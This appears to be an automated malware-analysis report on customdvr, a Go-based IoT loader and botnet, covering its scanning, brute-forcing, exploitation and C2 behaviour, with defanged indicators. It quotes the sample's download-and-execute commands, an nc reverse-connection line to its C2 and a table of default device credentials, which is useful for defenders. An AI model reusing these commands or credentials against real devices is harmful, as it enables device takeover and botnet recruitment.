---
title: "Malicious sample analysis: customdvr (ELF · elf · 5cfda71d)"
published: 2026-11-24
draft: false
description: "Malicious (confidence: medium): customdvr · loader/dropper/botnet · difficulty hard · dynamic sandbox + static decompilation"
tags: ["customdvr", "loader", "dropper", "botnet", "ELF"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-24-customdvr-5cfda71d"
---

> [!WARNING]
> **Verdict: malicious** · Family **customdvr** (unconfirmed) · Confidence **medium**
> 
> Aliases: Go-based IoT dropper, Mirai-style DVR/router loader
> 
> Static decompilation and symbol recovery reveal a complete attack chain: random IPv4 scanning, HTTP fingerprinting, a built-in vendor default-credential table, 20+ classes of DVR/router/camera exploits, downloading and executing r.sh, opening reverse sessions with nc/busybox telnetd, and writing successful targets to report_bots/linux. Every capability is backed by function, hardcoded-command and string evidence; this is not an ordinary scanning tool.

## Quick Overview

| Item | Content |
|:--|:--|
| Family | **customdvr** · Aliases Go-based IoT dropper, Mirai-style DVR/router loader · _unconfirmed_ |
| Confidence | **medium** |
| Behavior class | loader · dropper · botnet |
| Difficulty | hard |
| First seen | 2026-11-24 12:34:49 |
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/5cfda71da6af155bb0b3d88b8599453d25f6ecc4c0fff2a05f290e7d57d09ec5/) |

## Attack Chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="34" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Load dropper directory at startup</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1005</text>
<rect x="586" y="23" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="38" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Print delivery statistics</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Probe device fingerprint</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1046</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Brute-force default credentials</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1110.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Exploit device vulnerabilities</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1190</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
</svg>

## Sample Identification

| Item | Value |
|:--|:--|
| SHA-256 | `5cfda71da6af155bb0b3d88b8599453d25f6ecc4c0fff2a05f290e7d57d09ec5` |
| MD5 | _Not recorded_ |
| Size | 6,029,496 bytes (5.8 MB) |
| Type | ELF · `elf` |

## Behavior Analysis

There are **11** behaviors in total, each backed by evidence; **9** are statically available and **2** were obtained through dynamic analysis.

### 1. Load dropper directory at startup

`T1005` · Confidence **high** · Dynamic

At startup it opens dlrs/ under the working directory and picks the dropper binaries to deliver by architecture name such as arm5/arm6/arm7/mips/mpsl/nonempsl; if the directory does not exist it prints an error and exits immediately.

> **Evidence**: main.telnetLoadDroppers(VA 0x263b64) opens dlrs/; dynamic syscall tracing shows openat("dlrs", O_RDONLY|O_CLOEXEC) = -1 ENOENT, followed by writing "Error: Failed to open dlrs/" and exiting
> 
> **Source**: `ref:dc00d2548c` · `ref:2520a77c98` · `ref:2177903e53`

### 2. Print delivery statistics

`T1105` · Confidence **high** · Dynamic

At runtime it maintains and prints Payload Sent / Telnet Opened / Shells / Go Routines counters to track delivery and shell-acquisition progress against target devices.

> **Evidence**: dynamic write(1, "0's | Payload Sent: 0 | Telnet Opened: 0 | Shells: 0 | Go Routines: 2"); main.titleWriter(VA 0x286d10) formats that statistics string
> 
> **Source**: `ref:dc00d2548c` · `ref:969bf53ee8`

### 3. Probe device fingerprint

`T1046` · Confidence **high** · Static

It opens TCP connections to random IPv4 targets and sends GET / HTTP/1.1, determining the device type from Server-header and page-title fingerprints (Boa, GoAhead-Webs, uc-httpd, micro_httpd, JAWS, Avtech, httpd_four-faith and others).

> **Evidence**: main.httpBannerCheck(VA 0x2866e0) sends "GET / HTTP/1.1\r\nHost: "; main.scannerInitExploits(VA 0x283798) registers the device fingerprint strings
> 
> **Source**: `ref:e89a4b31ee` · `ref:969bf53ee8`

### 4. Brute-force default credentials

`T1110.001` · Confidence **high** · Static

It embeds many vendor default/leaked account credentials (adminpldt, telecomadmin, stdONU101, CUadmin, root:hi3518 and others) and tries them against Telnet 23/2323 and the HTTP login interfaces of various devices.

> **Evidence**: .rodata credential table; login functions such as main.telnetLoader(VA 0x2653b0), main.zteBrute(VA 0x274758), main.wavlinkloginDevice(VA 0x2807b8), main.gozyloginDevice(VA 0x2820cc)
> 
> **Source**: `ref:2177903e53` · `ref:e89a4b31ee`

### 5. Exploit device vulnerabilities for injection

`T1190` · Confidence **high** · Static

It embeds 20+ classes of command-injection and unauthenticated-interface exploit chains for DVRs, routers and cameras (TVT, DVRIP, Magic, GPON Fiber, Asus RT, AVTECH, Zyxel, Ruckus, Wavlink, GoAhead/goform, Brickcom and others) to deliver shell commands to devices.

> **Evidence**: main.scannerInitExploits registers infectFunction*; for example, main.infectFunctionDvrip(VA 0x267f94) injects via /cgi-bin/webui/admin/tools/app_ping, and main.infectFunctionTvt(VA 0x2690a4) uses NVMS-9000 XML requests
> 
> **Source**: `ref:e89a4b31ee` · `ref:2177903e53`

### 6. Download and execute a script

`T1105` · Confidence **high** · Static

It has the compromised device use wget/curl to fetch r.sh from hxxp://45[.]198[.]224[.]75/run.sh (or z.sh), then chmod 755 and execute it; alternatively, it writes a local dropper into a writable directory on the device with echo -ne and runs it.

> **Evidence**: main.telnetDropDropper(VA 0x254574) contains the literals "wget ... -O r.sh", "chmod 755 r.sh && ./r.sh" and "hxxp://45.198.224[.]75/run.sh"
> 
> **Source**: `ref:2520a77c98` · `ref:2177903e53` · `ref:b491c4cb6f`

### 7. Open reverse-connect sessions

`T1059.004` · Confidence **high** · Static

It uses injected commands to run nc 45[.]198[.]224[.]75 8999 > cmd on the device to establish a reverse connection, or starts /bin/busybox telnetd -p to open a telnet port for the operator to deliver further commands.

> **Evidence**: "nc%2045.198.224.75%208999%20%3e%20cmd" in infectFunctionDvrip/goCloudSendPayload; "/bin/busybox telnetd -p" in telnetLoader
> 
> **Source**: `ref:2177903e53` · `ref:e89a4b31ee`

### 8. Clean up competing processes

`T1489` · Confidence **high** · Static

It runs pkill -9 telnetd; killall telnetd; killall busybox on the target device and repeatedly restarts its own telnetd (.pi) to monopolize the device and exclude other botnets.

> **Evidence**: strings "pkill -9 telnetd; killall telnetd; killall busybox" and "/bin/busybox chmod 777 .pi;./.pi" in telnetLoader/telnetWritableDir
> 
> **Source**: `ref:2177903e53`

### 9. Local listener for callbacks

`T1571` · Confidence **high** · Static

The argv[1]=="listen" branch listens on 0.0.0[.]0:19412, accepts shells called back from infected devices and enters a command-interaction loop.

> **Evidence**: main.main(VA 0x286efc) calls net.Listen(VA 0x132fe0) with address string "0.0.0[.]0:19412" and compares os.Args[1] against "listen"
> 
> **Source**: `ref:969bf53ee8` · `ref:2177903e53`

### 10. Evade honeypot detection

`T1497` · Confidence **medium** · Static

It checks probe responses for honeypot characteristics; on a hit it prints scanner:%s detected honeypot and abandons the target.

> **Evidence**: main.detectHoneypot(VA 0x2865c0) and the string "scanner:%s detected honeypot"
> 
> **Source**: `ref:e89a4b31ee` · `ref:2177903e53`

### 11. Record infection results

`T1074` · Confidence **medium** · Static

It writes the addresses of successfully logged-in/infected devices to report_bots/linux and _infected.txt for later statistics and reuse.

> **Evidence**: main.logDevice(VA 0x26320c) references "report_bots/linux" and "_infected.txt"
> 
> **Source**: `ref:e89a4b31ee` · `ref:2177903e53`


## IOCs (defanged)

### Network

:::caution
**Pending dynamic verification**: The above addresses come from static analysis; no successful connection or session was observed in the network-isolated analysis environment, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://45[.]198[.]224[.]75/run.sh` | 80 | download | Static | ⏳ Not observed |
| http | `hxxp://45[.]198[.]224[.]75/z.sh` | 80 | download | Static | ⏳ Not observed |
| tcp | `45[.]198[.]224[.]75:8999` | 8999 | c2 | Static | ⏳ Not observed |
| tcp | `0[.]0[.]0[.]0:19412 (local listener receiving device callback shells)` | 19412 | c2 | Static | ⏳ Not observed |
| http | `multi[.]dm900 / multi[.]spain / multi[.]gponfiber / multi[.]usgflex[.]mips and other bare hostnames without a TLD (payload distribution)` | 80 | download | Static | ⏳ Not observed |
| http | `hxxp://212[.]75[.]138[.]206:8080 (Asus RT firewall parameter next_host)` | 8080 | c2 | Static | ⏳ Not observed |

### Host

**Drop path**

- `dlrs/`
- `.pi`
- `/tmp/vc`
- `/tmp/`
- `report_bots/linux`
- `_infected.txt`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `45.198.224[.]75` | Yes | Static |
| `payload_urls` | `/run.sh, /z.sh` | Yes | Static |
| `reverse_shell_port` | `8999` | Yes | Static |
| `listener_port` | `19412` | Yes | Static |
| `payload_staging_dir` | `dlrs/ (selected by arm5/arm6/arm7/mips/mpsl/nonempsl architecture)` | Yes | Dynamic |
| `multi_hosts` | `multi.dm900, multi[.]spain, multi[.]zhone, multi[.]faith, multi[.]vigor, multi[.]tenda, multi[.]dlink, multi[.]gponfiber, multi[.]usgflex[.]mips, multi[.]libdvr, multi[.]dvrip, multi[.]hongdian, multi[.]baicells, multi[.]gargoyle, multi[.]tvt, multi[.]zte` | No | Static |
| `default_credentials` | `adminpldt:pldt1234, adminpldt:z6dUABtl270qRxt7a2uGTiw, telecomadmin:G3p0n#n3t, admin:stdONU101, CUadmin, root:hi3518, root:klv123, guest:guest, admin:mertx, admin:ZZprigorel123 and others` | Yes | Static |
| `auth_scheme` | `HTTP Basic / Digest (including the digest-auth client dependency)` | No | Static |
| `report_files` | `report_bots/linux, _infected.txt` | No | Static |

## Do Not Misjudge

:::important
The following conclusions are **easy to misjudge**; please note them when citing this report.

- Do not call it ransomware or an infostealer: there is no file encryption, keylogging or credential-exfiltration logic; the embedded credentials are used only to log in to attacked devices.
- Do not claim a real C2 session or successful outbound connection was observed: the dynamic run exited before any network activity because the dlrs/ payload directory was missing, and the dynamic environment is network-isolated; all C2s are statically extracted and pending verification.
- Do not treat 212[.]75[.]138[.]206:8080 as an independent C2 on its own: it appears only as the next_host parameter of the Asus RT firewall-rewrite request, and its actual purpose has not been dynamically confirmed.
- Do not treat bare hostnames such as multi[.]dm900 as directly reachable full domains: no TLD appears in the sample, and the actual resolution/concatenation method is unconfirmed.
:::

## Analysis Method and Limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Unpacking | No |

**Limitations and pending verification**

1. The sample printed an error and exited at startup because the sibling dlrs/ payload directory was missing; no socket/connect syscall occurred in the dynamic window, so C2 and outbound behavior cannot be dynamically confirmed.
2. The dynamic environment's network namespace is isolated, so even entering the scanning stage would not establish real outbound connections; C2 availability, protocol and callback role can only come from static code and strings.
3. No multi-engine scan or YARA hit was obtained; the family is named after the Go build path customdvr, which does not map definitively to any public family, so the naming is uncertain.
4. The multi.* payload hostnames lack a TLD, and no protocol-prefix concatenation code was dynamically executed, so the actual download URL form is unconfirmed.
5. The sample is ARM32 and requires instruction translation to run, so some memory/register-level dynamic details (such as whether the listening port was successfully bound) could not be observed.

## Evidence Index

<details>
<summary>Expand 8 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000031` | Scripted forensics | Parsed Go pclntab and .go.buildinfo: 221 main.* functions, module customdvr, Go 1.24.0/ARM/GOARM=6, digest-auth dependency, Telnet loader chain and a list of 20+ device exploit functions |
| `ev-000032` | Scripted forensics | Extracted .rodata delivery/control strings: 45.198.224[.]75/run.sh and z.sh, nc 8999, 0.0.0[.]0:19412, multi.* hosts, dlrs/ and architecture names, report_bots/linux, _infected.txt, cleanup commands, default credentials, 212.75.138[.]206:8080 |
| `ev-000007` | decompile.function | main.telnetLoadDroppers pseudocode: loads architecture-specific droppers under dlrs/ and builds write/execute commands |
| `ev-000008` | decompile.function | main.main pseudocode: calls telnetLoadDroppers then scannerInitExploits, listens with net.Listen and compares argv[1]=="listen" |
| `ev-000019` | dyn.trace.strace | Dynamic syscall tracing: after openat("dlrs") = ENOENT it prints statistics and the error then exits, with no socket calls |
| `ev-000001` | String extraction | String scan: 14k+ ASCII strings and flag candidates, including payload/credential/URL context |
| `ev-000009` | Cryptographic constant identification | AES/MD5/SHA-1/SHA-256/CRC32/base64 constants, all from Go standard-library crypto implementations |
| `ref:f0a4a19b00` | ELF structure parsing | ELF32 little-endian ARM EXEC, statically linked, no interp/DT_NEEDED, entry VA 0x962F0 |

</details>

---

_The sample in this report is not public, IOCs have been defanged, and this is for security research only._
